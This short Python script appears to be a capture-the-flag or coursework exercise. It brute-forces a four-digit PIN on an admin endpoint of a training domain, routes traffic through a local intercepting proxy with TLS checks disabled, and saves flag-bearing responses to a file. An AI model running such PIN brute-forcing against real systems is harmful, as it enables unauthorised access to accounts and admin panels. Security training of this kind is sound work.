import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

for d1 in range(0, 10):
    for d2 in range(0, 10):
        for d3 in range(0, 10):
            for d4 in range(0, 10):
                pin = str(d1) + str(d2) + str(d3) + str(d4)
                data = {}
                data["pin"] = pin
                print(f"Trying pin: {pin}")
                r = requests.post(f"https://files.quoccabank.com/admin", allow_redirects=False, proxies=proxies, verify=False, data=data)
                if r.status_code == 302 or "COMP" in r.text:
                    f = open("flags.txt", "a")
                    f.write(r.text)
                    break
            else:
                continue
            break
        else:
            continue
        break
    else:
        continue
    break
